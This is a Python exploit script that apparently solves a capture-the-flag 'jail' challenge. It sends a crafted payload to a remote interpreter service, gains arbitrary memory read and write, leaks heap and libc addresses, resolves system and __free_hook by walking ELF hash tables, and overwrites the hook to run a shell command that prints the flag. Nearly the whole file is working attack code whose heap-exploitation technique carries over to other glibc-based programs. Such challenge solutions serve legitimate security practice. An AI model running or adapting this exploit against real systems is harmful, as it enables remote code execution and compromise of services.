#!/usr/bin/env python3
import re
import socket
import struct
import sys
import time

PAGE = 0x1000

p64 = lambda x: struct.pack("<Q", x)
u16 = lambda b, o=0: struct.unpack_from("<H", b, o)[0]
u32 = lambda b, o=0: struct.unpack_from("<I", b, o)[0]
u64 = lambda b, o=0: struct.unpack_from("<Q", b, o)[0]


def build_payload(command: str = "/bin/cat /flag-*") -> bytes:
    if any(ch in command for ch in ['"', "\\", "\n", "\r"]):
        raise ValueError("command contains unsupported characters")

    def set_byte(index: int, value: int) -> str:
        return f"<{index}><{value}>~S.ns~~S.si~"

    def input_byte(index: int) -> str:
        return f"<{index}>~I.c~~S.si~"

    def set_qword(index: int, value: int) -> str:
        return "".join(
            set_byte(index + i, byte)
            for i, byte in enumerate(p64(value))
        )

    zero_header = "".join(set_byte(i, 0) for i in range(15))

    leak_qword = "".join(
        "0<256>~A.mod~~S.ns~~O.o~<256>~A.d~~A.f~"
        for _ in range(8)
    )

    input_addr = "".join(input_byte(0x270 + i) for i in range(8))
    set_length = lambda value: set_qword(0x278, value)

    arbitrary_read = (
        input_addr
        + set_length(0x1000)
        + "R*~O.o~X<0>="
    )

    read_8_bytes = (
        'R""'
        + "".join("~I.c~~S.a~" for _ in range(8))
        + "="
    )

    arbitrary_write = (
        input_addr
        + set_length(8)
        + read_8_bytes
        + f'"{command}",^'
    )

    payload = (
        "{D[q]}"
        "{C[(c__)x<1>=][u z<0>=]}"
        "{M[h(_a)D!(_b)C!F(_b)u.=]"
        "[m(_t)$(_t)h.?"
        '<0>"RRRRRRRRRRR""AAAAAAAAAAAAAAA"'
        + zero_header
        + "~S.l~F*?"
        + set_qword(0xE8, 0x7FFFFFFF)
        + "~S.l~"
        + leak_qword
        + ","
        + "~V.n~,~V.n~,~V.n~,~V.n~"
        + "R<0>="
        + set_byte(0x260, 2)
        + set_qword(0x280, 0x7FFFFFFFFFFFFFFF)
        + '"'
        + "A" * 4096
        + '"G"'
        + "B" * 64
        + '"=,L<1>=/LP~I.c~='
        + 'EP*"q"~S.e~=XP*"r"~S.e~=WP*"w"~S.e~=/EL<0>=E<0>=\\/X'
        + arbitrary_read
        + "\\/W"
        + arbitrary_write
        + "\\\\]}"
    )

    encoded = payload.encode()
    if b"\n" in encoded:
        raise RuntimeError("payload unexpectedly contains newline")
    return encoded


class RemoteTube:
    def __init__(self, host: str, port: int, timeout: float = 20.0):
        self.sock = socket.create_connection((host, port), timeout)
        self.sock.settimeout(timeout)
        self.sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        self.timeout = timeout

    def send(self, data: bytes) -> None:
        self.sock.sendall(data)

    def recvn(self, size: int, context: str = "receive") -> bytes:
        result = b""
        try:
            while len(result) < size:
                chunk = self.sock.recv(size - len(result))
                if not chunk:
                    raise EOFError(
                        f"{context}: wanted {size} bytes, got {len(result)}"
                    )
                result += chunk
        except socket.timeout as exc:
            raise TimeoutError(
                f"{context}: timed out after {self.timeout:.1f}s "
                f"({len(result)}/{size} bytes received)"
            ) from exc
        return result

    def read_all(self, timeout: float = 8.0) -> bytes:
        self.sock.settimeout(0.25)
        result = b""
        deadline = time.time() + timeout

        while time.time() < deadline:
            try:
                chunk = self.sock.recv(65536)
                if not chunk:
                    break
                result += chunk
                deadline = time.time() + 0.75
            except socket.timeout:
                pass

        return result

    def close(self) -> None:
        try:
            self.sock.close()
        except Exception:
            pass


class Memory:
    def __init__(self, tube: RemoteTube):
        self.tube = tube
        self.cache = {}

    def page(self, address: int) -> bytes:
        address &= -PAGE
        if address not in self.cache:
            print(f"    [read] {address:#x}", flush=True)
            self.tube.send(b"r" + p64(address))
            self.cache[address] = self.tube.recvn(
                PAGE, context=f"reading page {address:#x}"
            )
        return self.cache[address]

    def read(self, address: int, size: int) -> bytes:
        result = b""

        while size:
            page_addr = address & -PAGE
            offset = address - page_addr
            chunk_size = min(size, PAGE - offset)

            result += self.page(page_addr)[offset:offset + chunk_size]

            address += chunk_size
            size -= chunk_size

        return result

    def dword(self, address: int) -> int:
        return u32(self.read(address, 4))

    def cstring(self, address: int, limit: int = 0x400) -> bytes:
        result = b""

        while len(result) < limit:
            chunk = self.read(
                address + len(result),
                min(0x80, limit - len(result)),
            )

            nul = chunk.find(b"\x00")
            if nul >= 0:
                return result + chunk[:nul]

            result += chunk

        return result


def gnu_hash(name: bytes) -> int:
    value = 5381
    for byte in name:
        value = ((value << 5) + value + byte) & 0xFFFFFFFF
    return value


class ELFMemory:
    def __init__(self, memory: Memory, base: int):
        self.memory = memory
        self.base = base

        ehdr = memory.read(base, 0x40)
        if ehdr[:4] != b"\x7fELF":
            raise ValueError("not ELF")

        phoff = u64(ehdr, 0x20)
        phentsize = u16(ehdr, 0x36)
        phnum = u16(ehdr, 0x38)

        dynamic_addr = 0

        for i in range(phnum):
            phdr = memory.read(
                base + phoff + i * phentsize,
                phentsize,
            )
            if u32(phdr) == 2:  # PT_DYNAMIC
                dynamic_addr = base + u64(phdr, 0x10)
                break

        if not dynamic_addr:
            raise RuntimeError("PT_DYNAMIC not found")

        self.dynamic = {}

        for i in range(0x400):
            entry = memory.read(dynamic_addr + i * 16, 16)
            tag = u64(entry)
            value = u64(entry, 8)

            if tag == 0:
                break

            self.dynamic[tag] = value

        for tag in (4, 5, 6, 0x6FFFFEF5):
            if tag in self.dynamic and self.dynamic[tag] < base:
                self.dynamic[tag] += base

    def symbol(self, name: str) -> int:
        target = name.encode()

        strtab = self.dynamic[5]
        symtab = self.dynamic[6]
        syment = self.dynamic.get(11, 24)
        gnu_hash_addr = self.dynamic[0x6FFFFEF5]

        nbuckets = self.memory.dword(gnu_hash_addr)
        symoffset = self.memory.dword(gnu_hash_addr + 4)
        bloom_size = self.memory.dword(gnu_hash_addr + 8)

        buckets = gnu_hash_addr + 16 + bloom_size * 8
        chains = buckets + nbuckets * 4

        wanted_hash = gnu_hash(target)
        index = self.memory.dword(
            buckets + (wanted_hash % nbuckets) * 4
        )

        if index < symoffset:
            raise KeyError(name)

        for _ in range(100000):
            chain_hash = self.memory.dword(
                chains + (index - symoffset) * 4
            )

            if (chain_hash | 1) == (wanted_hash | 1):
                symbol = self.memory.read(
                    symtab + index * syment,
                    24,
                )

                symbol_name = self.memory.cstring(
                    strtab + u32(symbol)
                )

                if symbol_name == target:
                    return self.base + u64(symbol, 8)

            if chain_hash & 1:
                break

            index += 1

        raise KeyError(name)


def find_arena(memory: Memory, heap: int) -> int:
    heap_page = heap & -PAGE

    # The crafted heap has the useful unsorted-bin metadata nearby.
    # Reading far past it can cross the valid heap mapping and stall/crash.
    for page_index in range(8):
        data = memory.page(heap_page + page_index * PAGE)

        for offset in range(0, PAGE - 16, 8):
            first = u64(data, offset)
            second = u64(data, offset + 8)

            if (
                first == second
                and 0x700000000000 <= first < 0x800000000000
            ):
                return first

    raise RuntimeError("main_arena leak not found in the first 8 valid heap pages")


def find_libc(memory: Memory, arena: int) -> int:
    candidate = (arena - 0x1E0000) & -PAGE

    for _ in range(0x400):
        if memory.page(candidate)[:4] == b"\x7fELF":
            return candidate
        candidate -= PAGE

    raise RuntimeError("libc ELF base not found")


def exploit(host: str, port: int) -> str:
    tube = RemoteTube(host, port)

    try:
        payload = build_payload()

        print(f"[+] connecting to {host}:{port}")
        print(f"[+] payload size: {len(payload)} bytes")

        tube.send(payload + b"\n")

        heap = u64(tube.recvn(8, context="waiting for initial heap leak"))
        print(f"[+] heap leak: {heap:#x}")

        memory = Memory(tube)

        arena = find_arena(memory, heap)
        print(f"[+] arena leak: {arena:#x}")

        libc_base = find_libc(memory, arena)
        print(f"[+] libc base: {libc_base:#x}")

        elf = ELFMemory(memory, libc_base)

        system = elf.symbol("system")
        free_hook = elf.symbol("__free_hook")

        print(f"[+] system: {system:#x}")
        print(f"[+] __free_hook: {free_hook:#x}")

        tube.send(
            b"w"
            + p64(free_hook)
            + p64(system)
        )

        output = tube.read_all()

        sys.stdout.buffer.write(output)
        sys.stdout.buffer.flush()

        match = re.search(
            rb"jail\{[^}\r\n]+\}",
            output,
        )

        if not match:
            raise RuntimeError("flag not found in remote output")

        flag = match.group().decode()
        print(f"\n[+] FLAG: {flag}")
        return flag

    finally:
        tube.close()


def main() -> int:
    if len(sys.argv) != 3:
        print(
            f"Usage: {sys.argv[0]} HOST PORT",
            file=sys.stderr,
        )
        print(
            f"Example: {sys.argv[0]} challs.pyjail.club 29269",
            file=sys.stderr,
        )
        return 1

    host = sys.argv[1]

    try:
        port = int(sys.argv[2])
    except ValueError:
        print("PORT must be an integer", file=sys.stderr)
        return 1

    try:
        exploit(host, port)
    except Exception as exc:
        print(
            f"\n[-] exploit failed: {type(exc).__name__}: {exc}",
            file=sys.stderr,
        )
        return 2

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
